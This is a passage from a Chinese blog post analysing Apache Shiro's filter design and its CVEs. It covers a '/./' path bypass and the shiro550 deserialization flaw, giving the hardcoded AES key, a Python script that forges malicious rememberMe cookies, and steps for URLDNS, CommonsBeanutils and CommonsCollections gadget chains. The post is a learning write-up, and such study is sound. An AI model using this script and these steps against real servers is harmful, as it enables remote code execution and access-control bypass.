class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>org.su18.shiro.web.config.WebEnvironment<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>context-param</span><span class="token punctuation">></span></span></code></pre><p>关于 INI 配置文件的配置，在官方文档<a href="https://shiro.apache.org/configuration.html">配置</a>一章有详细描述，主要包括 <code>[main]</code>、<code>[users]</code>、<code>[roles]</code>、<code>[urls]</code> 四项配置。如果配置了 <code>[users]</code> 或 <code>[roles]</code>，则会自动创建 <code>org.apache.shiro.realm.text.IniRealm</code> 实例，并可以在 <code>[main]</code> 配置中进行调用及配置。</p><p>这里重点的配置，就在于 <code>[urls]</code> 这个配置项，详情参考相关官方配置<a href="https://shiro.apache.org/web.html#Web-%3C!--swig%EF%BF%BC14--%3E">文档</a>。大概可以配置成如下形式：</p><pre class="language-ini" data-language="ini"><code class="language-ini">[urls]&#x2F;index &#x3D; anon&#x2F;user&#x2F;** &#x3D; authc&#x2F;admin&#x2F;** &#x3D; authc, roles[administrator]&#x2F;audit&#x2F;** &#x3D; authc, perms[&quot;remote:invoke&quot;]</code></pre><p>简单来说，就是一个 Ant 风格的路径表达式与需要处理他的 Filter 之间的映射。Shiro 使用 <code>org.apache.shiro.web.filter.mgt.FilterChainManager</code> 自己维护一套 FilterChain 的机制，用来依次对多个 Filter 进行校验。</p><p>Shiro 默认提供了一些 Filter，名称及对应处理类如下表格，如果想深入理解某个 Filter 功能的具体实现，可以具体查看。</p><table><thead><tr><th align="left">Filter 名称</th><th align="left">对应类</th></tr></thead><tbody><tr><td align="left">anon</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/AnonymousFilter.html">org.apache.shiro.web.filter.authc.AnonymousFilter</a></td></tr><tr><td align="left">authc</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/FormAuthenticationFilter.html">org.apache.shiro.web.filter.authc.FormAuthenticationFilter</a></td></tr><tr><td align="left">authcBasic</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/BasicHttpAuthenticationFilter.html">org.apache.shiro.web.filter.authc.BasicHttpAuthenticationFilter</a></td></tr><tr><td align="left">authcBearer</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/BearerHttpAuthenticationFilter.html">org.apache.shiro.web.filter.authc.BearerHttpAuthenticationFilter</a></td></tr><tr><td align="left">invalidRequest</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/InvalidRequestFilter.html">org.apache.shiro.web.filter.InvalidRequestFilter</a></td></tr><tr><td align="left">logout</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/LogoutFilter.html">org.apache.shiro.web.filter.authc.LogoutFilter</a></td></tr><tr><td align="left">noSessionCreation</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/session/NoSessionCreationFilter.html">org.apache.shiro.web.filter.session.NoSessionCreationFilter</a></td></tr><tr><td align="left">perms</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/PermissionsAuthorizationFilter.html">org.apache.shiro.web.filter.authz.PermissionsAuthorizationFilter</a></td></tr><tr><td align="left">port</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/PortFilter.html">org.apache.shiro.web.filter.authz.PortFilter</a></td></tr><tr><td align="left">rest</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/HttpMethodPermissionFilter.html">org.apache.shiro.web.filter.authz.HttpMethodPermissionFilter</a></td></tr><tr><td align="left">roles</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/RolesAuthorizationFilter.html">org.apache.shiro.web.filter.authz.RolesAuthorizationFilter</a></td></tr><tr><td align="left">ssl</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authz/SslFilter.html">org.apache.shiro.web.filter.authz.SslFilter</a></td></tr><tr><td align="left">user</td><td align="left"><a href="https://shiro.apache.org/static/current/apidocs/org/apache/shiro/web/filter/authc/UserFilter.html">org.apache.shiro.web.filter.authc.UserFilter</a></td></tr></tbody></table><p>在请求访问到达 ShiroFilter 后，会根据 request 的信息，调用 <code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code> 方法匹配配置的 pathPattern 以及 requestURI，如果有匹配，则会添加一层 ProxiedFilterChain 代理。这里看到，如果 <code>pathMatches</code> 方法匹配，将会进行 return，因此配置的顺序也很重要。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641301764041.png" alt="img"></p><p>也就是说，Shiro 不会向 Servlet Context 中添加其他的 Filter，而是使用嵌套 ProxiedFilterChain 代理的方式扩展 FilterChain，并在自身 Filter 都处理结束之后继续执行原 FilterChain。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641301141206.png" alt="img"></p><p>这里简单说其实就是shiro在servlet的filter前面又套了一层filter，因此在调用的时候会先调shiro的filter，然后再调servlet自己的filter</p><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><p>在目前的环境下，越来越多的 Web 环境使用了 SpringBoot/SpringMVC 及相关生态，因此更多的时候会将 Shiro 集成配置在其中。为了应对此环境，Shiro 提供了 <code>shiro-spring</code> 包来进行配置。</p><p>在 Servlet 项目中，是通过在 <code>web.xml</code> 中配置了能匹配所有 URL 路径 <code>/*</code> 的 ShiroFilter，并由其执行后续逻辑。而在 Spring 生态下，由于 IoC 与 DI 的思想，通常把所有的 Filter 注册成为 Bean 交给 Spring 来管理。</p><p>此时如果想要将 Shiro 逻辑注入其中，就用到了关键类：<code>ShiroFilterFactoryBean</code>。这是 Shiro 为 Spring 生态提供的工厂类，由它在 spring 中承担了之前 ShiroFilter 的角色。内部类 SpringShiroFilter 继承了 AbstractShiroFilter，实现了类似的逻辑。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641350389722.png" alt="img"></p><p>可以结合 <code>spring-web</code> 包中的 DelegatingFilterProxy 配置使用，其作用就是一个 filter 的代理，被它代理的 filter 将由 spring 来管理其生命周期。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641349677712.png" alt="img"></p><p>ShiroFilterFactoryBean 还是 BeanPostProcessor 的子类，实现了对于 Filter 子类自动发现和处理的技术，所以我们可以通过配置 ShiroFilterFactoryBean 的方式来注册 SpringShiroFilter。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641362172288.png" alt="img"></p><p>其他的配置也可以全部交由 Spring 管理，我们只需要对 ShiroFilterFactoryBean 进行配置即可，简单的示例代码如下：</p><pre class="language-java" data-language="java"><code class="language-java">&#x2F;** * @author su18 *&#x2F;@Configurationpublic class ShiroConfig &#123;@BeanMyRealm myRealm() &#123;return new MyRealm();&#125;@BeanRememberMeManager cookieRememberMeManager() &#123;return new CookieRememberMeManager();&#125;@BeanSecurityManager securityManager(MyRealm myRealm, RememberMeManager cookieRememberMeManager) &#123;DefaultWebSecurityManager manager &#x3D; new DefaultWebSecurityManager();manager.setRealm((Realm) myRealm);manager.setRememberMeManager(cookieRememberMeManager);return manager;&#125;@Bean(name &#x3D; &#123;&quot;shiroFilter&quot;&#125;)ShiroFilterFactoryBean shiroFilterFactoryBean(SecurityManager securityManager) &#123;ShiroFilterFactoryBean bean &#x3D; new ShiroFilterFactoryBean();bean.setSecurityManager(securityManager);bean.setLoginUrl(&quot;&#x2F;index&#x2F;login&quot;);bean.setUnauthorizedUrl(&quot;&#x2F;index&#x2F;unauth&quot;);LinkedHashMap&lt;String, String&gt; map &#x3D; new LinkedHashMap&lt;String, String&gt;();map.put(&quot;&#x2F;index&#x2F;user&quot;, &quot;authc&quot;);map.put(&quot;&#x2F;index&#x2F;**&quot;, &quot;anon&quot;);map.put(&quot;&#x2F;audit&#x2F;**&quot;, &quot;authc, perms[\&quot;audit:list\&quot;]&quot;);map.put(&quot;&#x2F;admin&#x2F;**&quot;, &quot;authc, roles[admin]&quot;);map.put(&quot;&#x2F;logout&quot;, &quot;logout&quot;);bean.setFilterChainDefinitionMap(map);return bean;&#125;&#125;</code></pre><h1 id="安全漏洞"><a href="#安全漏洞" class="headerlink" title="安全漏洞"></a>安全漏洞</h1><p>这里是这篇文章的主要部分</p><p>根据官方网站上的漏洞<a href="https://shiro.apache.org/security-reports.html">通报</a>，shiro 在历史上共通报了 11 个 CVE，其中包含认证绕过、反序列化等漏洞类型</p><p>不过除了shiro550和shiro721，其他几个洞感觉全是路径解析造成的问题，所以可能就直接照抄参考文章了</p><h2 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h2><h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3863">CVE-2010-3863</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2010-2715">CNVD-2010-2715</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro &lt; 1.1.0 &amp; JSecurity 0.9.x</td></tr><tr><td align="left">漏洞描述</td><td align="left">Shiro 在对请求路径与 shiro.ini 配置文件配置的 AntPath 进行对比前 未进行路径标准化，导致使用时可能绕过权限校验</td></tr><tr><td align="left">漏洞关键字</td><td align="left">/./ | 路径标准化</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">Commit-ab82949</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL">https://vulners.com/nessus/SHIRO_SLASHDOT_BYPASS.NASL</a> <a href="https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2">https://marc.info/?l=bugtraq&amp;m=128880520013694&amp;w=2</a></td></tr></tbody></table><h3 id="漏洞详解"><a href="#漏洞详解" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>（没找到对应版本，凑合看吧</p><p>之前提到过，Shiro 使用 <code>PathMatchingFilterChainResolver#getChain</code> 方法获取和调用要执行的 Filter，逻辑如下：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641375097048.png" alt="img"></p><p><code>getPathWithinApplication()</code> 方法调用 <code>WebUtils.getPathWithinApplication()</code> 方法，用来获取请求路径。通过如下逻辑可看到，方法获取 Context 路径以及 URI 路径，然后使用字符串截取的方式去掉 Context 路径。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230501215129579.png" alt="image-20230501215129579"></p><p>获取 URI 路径的方法 <code>getRequestUri()</code> 获取 <code>javax.servlet.include.request_uri</code> 的值，并调用 <code>decodeAndCleanUriString()</code> 处理。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641376070079.png" alt="img"></p><p><code>decodeAndCleanUriString()</code> 是 URL Decode 及针对 JBoss/Jetty 等中间件在 url 处添加 <code>;jsessionid</code> 之类的字符串的适配，对 <code>;</code> 进行了截取。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641376084763.png" alt="img"></p><p>处理之后的请求 URL 将会使用 <code>AntPathMatcher#doMatch</code> 进行匹配尝试。</p><p>流程梳理到这里就出现了一个重大的问题：在匹配之前，没有进行标准化路径处理，导致 URI 中如果出现一些特殊的字符，就可能绕过安全校验。比如如下配置：</p><pre class="language-ini" data-language="ini"><code class="language-ini">[urls]&#x2F;user&#x2F;** &#x3D; authc&#x2F;admin&#x2F;list &#x3D; authc, roles[admin]&#x2F;admin&#x2F;** &#x3D; authc&#x2F;audit&#x2F;** &#x3D; authc, perms[&quot;audit:list&quot;]&#x2F;** &#x3D; anon</code></pre><p>在上面的配置中，为了一些有指定权限的需求的接口进行了配置，并为其他全部的 URL <code>/**</code> 设置了 <code>anno</code> 的权限。在这种配置下就会产生校验绕过的风险。</p><p>因为/./flag不会匹配到其中任何一个需要带权限访问的路径，因此就会导致成为了/**的anno权限，实现了越权访问</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>Shiro 在 <a href="https://github.com/apache/shiro/commit/ab8294940a19743583d91f0c7e29b405d197cc34">ab82949</a> 更新中添加了标准化路径函数。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641380817492.png" alt="img"></p><p>对 <code>/</code>、<code>//</code>、<code>/./</code>、<code>/../</code> 等进行了处理。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/1641380876074.png" alt="img"></p><h2 id="CVE-2014-0074"><a href="#CVE-2014-0074" class="headerlink" title="CVE-2014-0074"></a>CVE-2014-0074</h2><h3 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2014-0074</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2014-03861">CNVD-2014-03861</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-460">SHIRO-460</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro 1.x &lt; 1.2.3</td></tr><tr><td align="left">漏洞描述</td><td align="left">当程序使用LDAP服务器并启用非身份验证绑定时，远程攻击者可借助空的用户名或密码利用该漏洞绕过身份验证。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">ldap | 绕过 | 空密码 | 空用户名 | 匿名</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/f988846207f98c98ff24213ee9063798ea5d9b6c">Commit-f988846</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://stackoverflow.com/questions/21391572/shiro-authenticates-non-existent-user-in-ldap">https://stackoverflow.com/questions/21391572/shiro-authenticates...in-ldap</a> <a href="https://www.openldap.org/doc/admin24/security.html">https://www.openldap.org/doc/admin24/security.html</a></td></tr></tbody></table><p>这个感觉利用条件跟shiro关系好像不是很大，先放一下，等以后学了ldap再说</p><h2 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h2><h3 id="漏洞信息-2"><a href="#漏洞信息-2" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><table><thead><tr><th align="left">漏洞信息</th><th align="left">详情</th></tr></thead><tbody><tr><td align="left">漏洞编号</td><td align="left"><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0074">CVE-2016-4437</a> / <a href="https://www.cnvd.org.cn/flaw/show/CNVD-2016-03869">CNVD-2016-03869</a> / <a href="https://issues.apache.org/jira/browse/SHIRO-550">SHIRO-550</a></td></tr><tr><td align="left">影响版本</td><td align="left">shiro 1.x &lt; 1.2.5</td></tr><tr><td align="left">漏洞描述</td><td align="left">如果程序未能正确配置 “remember me” 功能使用的密钥。 攻击者可通过发送带有特制参数的请求利用该漏洞执行任意代码或访问受限制内容。</td></tr><tr><td align="left">漏洞关键字</td><td align="left">cookie | RememberMe | 反序列化 | 硬编码 | AES</td></tr><tr><td align="left">漏洞补丁</td><td align="left"><a href="https://github.com/apache/shiro/commit/4d5bb000a7f3c02d8960b32e694a565c95976848">Commit-4d5bb00</a></td></tr><tr><td align="left">相关链接</td><td align="left"><a href="https://issues.apache.org/jira/browse/SHIRO-441">SHIRO-441</a> <a href="https://www.anquanke.com/post/id/192619">https://www.anquanke.com/post/id/192619</a></td></tr></tbody></table><p>shiro的反序列化漏洞，算是shiro里比较重要的漏洞了</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p><a href="https://blog.csdn.net/m0_67401270/article/details/126721347">IDEA搭建shiro550复现环境_shiro550环境搭建_普通网友的博客-CSDN博客</a></p><h3 id="漏洞详解-1"><a href="#漏洞详解-1" class="headerlink" title="漏洞详解"></a>漏洞详解</h3><p>Shiro 从 0.9 版本开始设计了 RememberMe 的功能，用来提供在应用中记住用户登陆状态的功能。</p><h4 id="RememberMeManager"><a href="#RememberMeManager" class="headerlink" title="RememberMeManager"></a>RememberMeManager</h4><p>首先是接口 <code>org.apache.shiro.mgt.RememberMeManager</code>，这个接口提供了 5 个方法：</p><ul><li><code>getRememberedPrincipals</code>：在指定上下文中找到记住的 principals，也就是 RememberMe 的功能。</li><li><code>forgetIdentity</code>：忘记身份标识。</li><li><code>onSuccessfulLogin</code>：在登陆校验成功后调用，登陆成功时，保存对应的 principals 供程序未来进行访问。</li><li><code>onFailedLogin</code>：在登陆失败后调用，登陆失败时，在程序中“忘记”该 Subject 对应的 principals。</li><li><code>onLogout</code>: 在用户退出时调用，当一个 Subject 注销时，在程序中“忘记”该 Subject 对应的 principals。</li></ul><p>之前曾在 DefaultSecurityManager 的成员变量中见到了 RememberMeManager 成员变量，会在登陆、认证等逻辑中调用其中的相关方法。</p><h4 id="AbstractRememberMeManager"><a href="#AbstractRememberMeManager" class="headerlink" title="AbstractRememberMeManager"></a>AbstractRememberMeManager</h4><p>同时，Shiro 还提供了一个实现了 <code>RememberMeManager</code> 接口的抽象类 <code>AbstractRememberMeManager</code>，提供了一些实现技术细节。先介绍其中重要的几个成员变量：</p><ul><li><code>DEFAULT_CIPHER_KEY_BYTES</code>：一个 Base64 的硬编码的 AES Key，也是本次漏洞的关键点，这个 key 会被同时设置为加解密 key 成员变量：encryptionCipherKey/decryptionCipherKey 。</li><li><code>serializer</code>：Shiro 提供的序列化器，用来对序列化和反序列化标识用户身份的 PrincipalCollection 对象。</li><li><code>cipherService</code>：用来对数据加解密的类，实际上是 <code>org.apache.shiro.crypto.AesCipherService</code> 类，这是一个对称加密的实现，所以加解密的 key 是使用了同一个。</li></ul><p>在其初始化时，会创建 <code>DefaultSerializer</code> 作为序列化器，<code>AesCipherService</code> 作为加解密实现类，<code>DEFAULT_CIPHER_KEY_BYTES</code> 作为加解密的 key。</p><h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会将用户信息加密，加密过程:用户信息=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值。如果用户勾选记住密码，那么在请求中会携带cookie，并且将加密信息存放在cookie的rememberMe字段里面，在服务端收到请求对rememberMe值，先base64解码然后AES解密再反序列化，这个加密过程如果我们知道AES加密的密钥，那么我们把用户信息替换成恶意命令，就导致了反序列化RCE漏洞。在shiro版本&lt;=1.2.4中使用了默认密钥kPH+bIxk5D2deZiIxcaaaA==，这就更容易触发RCE漏洞。<br>所以我们Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><p>然后我们可以下个断点跟一下 shiro里的Filter 处理流程</p><p>调用链如下</p><pre class="language-java" data-language="java"><code class="language-java">AbstractShiroFilter.doFilterInternal()     AbstractShiroFilter.createSubject()        WebSubject.Builder.buildWebSubject()            Subject.Builder.buildSubject()                DefaultSecurityManager.createSubject()                    DefaultSecurityManager.resolvePrincipals()                        DefaultSecurityManager.getRememberedIdentity()                            AbstractRememberMeManager.getRememberedPrincipals()                                CookieRememberMeManager.getRememberedSerializedIdentity()</code></pre><p>首先，filter流程肯定要调用<code>AbstractShiroFilter#doFilterInternal</code> 方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502163153001.png" alt="image-20230502163153001"></p><p>然后去调用<code> AbstractShiroFilter.createSubject()</code>创建 Subject 对象</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502165433936.png" alt="image-20230502165433936"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502165550281.png" alt="image-20230502165550281"></p><p>创建 Subject 对象后，会试图从利用当前的上下文中的信息来解析当前用户的身份，将会调用 <code>DefaultSecurityManager#resolvePrincipals</code> 方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502165615393.png" alt="image-20230502165615393"></p><p>继续调用 <code>AbstractRememberMeManager#getRememberedPrincipals</code> 方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502172132028.png" alt="image-20230502172132028"></p><p>这个方法就是将 SubjectContext 中的信息转为 PrincipalCollection 的关键方法，也是漏洞触发点。在 try 语句块中共有两个方法，分别是 <code>getRememberedSerializedIdentity</code> 和 <code>convertBytesToPrincipals</code> 方法。</p><p>getRememberedSerializedIdentity我们之前提过这个方法，其实看名字也知道是读取序列化的用户信息，作用就是获取 Cookie 中的内容并 Base64 解码返回 byte 数组。</p><p>然后这个返回的byte数组又传到了convertBytesToPrincipals方法里面进行处理</p><p>在这个方法里，调用了一个解密和反序列化的方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502174748375.png" alt="image-20230502174748375"></p><p>先看这个解密函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502174929737.png" alt="image-20230502174929737"></p><p>跟一下这个<code>CipherService cipherService = getCipherService();</code>就能发现他是负责加密方式的，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175143197.png" alt="image-20230502175143197"></p><p>就是给一个aes的加密</p><p>然后在这一行进行真正的加密操作</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175244034.png" alt="image-20230502175244034"></p><p>看名字也能猜出来，一个放密文，一个放密钥</p><p>密文肯定就是我们cookie里的东西，这个可以先不看，所以先看看密钥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175337745.png" alt="image-20230502175337745"></p><p>再往里跟会发现这个密钥其实是个常量</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175551924.png" alt="image-20230502175551924"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175604656.png" alt="image-20230502175604656"></p><p>这就是shiro550最根本的漏洞原因</p><p>由于对cookie内容的aes解密密钥采用的是固定值，因此我们可以通过获取这一密钥来修改cookie中的内容，使在之后的反序列化过程中反序列化我们构造的恶意cookie</p><p>接下来再来看反序列化的过程</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502175918159.png" alt="image-20230502175918159"></p><p>这里就是调了一个原生的readObject，因此我们就可以去利用这一反序列化</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在漏洞利用之前还要说一点前提</p><p>在shiro中，选择了remember登录后，系统会给出两个cookie，一个是JSESSIONID，另一个是rememberMe，而当JSESSIONID存在的时候，shiro可以直接通过<code>DefaultSecurityManager#resolvePrincipals</code> 方法判断用户的角色，因此用户角色不为空，也就不会进入到这个if判断里，从而就不会进入getRememberedIdentity，更别说去获取rememberMe的值进行解密和反序列化操作了。所以漏洞利用的时候构造完payload还要把JSESSIONID删了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502180258729.png" alt="image-20230502180258729"></p><p>接下来是正式利用的部分</p><p>我们先尝试着去进行java原生的反序列化，也就是urldns链</p><h4 id="urldns链"><a href="#urldns链" class="headerlink" title="urldns链"></a>urldns链</h4><p>当我们成功登录时，可以看到返回的内容中存在很长一串cookie</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502180623950.png" alt="image-20230502180623950"></p><p>首先生成一个urldns的payload文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181328618.png" alt="image-20230502181328618"></p><p>aes加密脚本</p><pre class="language-python" data-language="python"><code class="language-python">import sysimport base64import uuidfrom random import Randomfrom Crypto.Cipher import AESdef get_file(filename):    with open(filename,&#39;rb&#39;) as f:        data &#x3D; f.read()    return datadef aesEncode(data):    BS &#x3D; AES.block_size    pad &#x3D; lambda s: s + ((BS-len(s)%BS)) * chr(BS-len(s)%BS).encode()    key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;    mode &#x3D; AES.MODE_CBC    iv &#x3D; uuid.uuid4().bytes    encryptor &#x3D; AES.new(base64.b64decode(key),mode,iv)    ciphertext &#x3D; base64.b64encode(iv+encryptor.encrypt(pad(data)))    return ciphertextdef aesDecode(enc_data):    enc_data &#x3D; base64.b64decode(enc_data)    unpad &#x3D; lambda s:s[:-s[-1]]    key &#x3D; &quot;kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;&quot;    mode &#x3D; AES.MODE_CBC    iv &#x3D; enc_data[:16]    encryptor &#x3D; AES.new(base64.b64decode(key),mode,iv)    plaintext &#x3D; encryptor.decrypt(enc_data[16:])    plaintext &#x3D; unpad(plaintext)    return plaintextif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    data &#x3D; get_file(&quot;ser.bin&quot;)    print(aesEncode(data))</code></pre><p>执行加密脚本生成payload</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181456556.png" alt="image-20230502181456556"></p><p>修改rememberMe的值然后刷新一下提交，看看bp里就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181449872.png" alt="image-20230502181449872"></p><p>调试一下也能看见</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502181724431.png" alt="image-20230502181724431"></p><p>反序列化的时候有了个HashMap，说明我们的URLDNS链成功调用了</p><p>可是只能发起dns请求可还不够，我们的目的是命令执行</p><h4 id="CB链无依赖打shiro550"><a href="#CB链无依赖打shiro550" class="headerlink" title="CB链无依赖打shiro550"></a>CB链无依赖打shiro550</h4><p>之前写CB链的那个文章也说了，就是专门为了shiro550才学的，所以这里直接用了（记得jdk版本改一改，一下午的教训</p><p>这里也要注意一个问题，就是如果直接用CB那篇文章里的配置来打shiro550是不会成功的，在控制台可以看见这样的报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502182726959.png" alt="image-20230502182726959"></p><p>这是因为shiro里自带的CB是1.8.3版本</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502182813089.png" alt="image-20230502182813089"></p><p>而1.9+版本的CB修改了一些类的serialVersionUID，也就是java序列化的唯一标识，所以会报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502195627032.png" alt="image-20230502195627032"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502195618090.png" alt="image-20230502195618090"></p><h4 id="CC链打shiro550"><a href="#CC链打shiro550" class="headerlink" title="CC链打shiro550"></a>CC链打shiro550</h4><p>虽然已经有了CB无依赖打shiro550这条链，但是还是写一下关于CC链打shiro的链子吧</p><p>先把cc依赖放进去</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502200817704.png" alt="image-20230502200817704"></p><p>然后我们先随便找个对应的cc链打一下</p><p>可以发现计算器没弹出来，然后在shiro的控制台里可以看见有这种报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230502201211712.png" alt="image-20230502201211712"></p><p>一个是Transformer类没加载出来，另一个是不能对字节数组反序列化</p><p>这个问题具体的原因可以看这个<a href="https://www.bilibili.com/video/BV1dq4y1B76x/?spm_id_from=333.788&vd_source=053f03b424a45370bc5813843ae5268f">Shiro反序列化漏洞(二)-shiro下的CC链利用</a>，是tomcat的类加载器的问题</p><p>简单的原因是Shiro 使用 <code>ClassResolvingObjectInputStream</code> 执行反序列化的操作，这个类重写了 <code>resolveClass</code> ，实际使用 <code>ClassLoader.loadClass()</code> 方式而非 ObjectInputStream 中的 <code>Class.forName()</code> 的方式。而 <code>forName</code> 的方式可以加载任意的数组类型，<code>loadClass</code> 只能加载原生的类型的 Object Array。</p><blockquote><p>p牛的结论是 <strong>如果反序列化流中包含非 Java 自身的数组，则会出现无法加载类的错误</strong>。</p></blockquote><p>现在一般有两种解决方法</p><ul><li>使用 RMI 中的 Gadget 做跳板，再执行 CC 反序列化链，这样可以加载；</li><li>改造 CC 链，组合 InvokerTransformer 与 TemplatesImpl，避免使用 Transformer 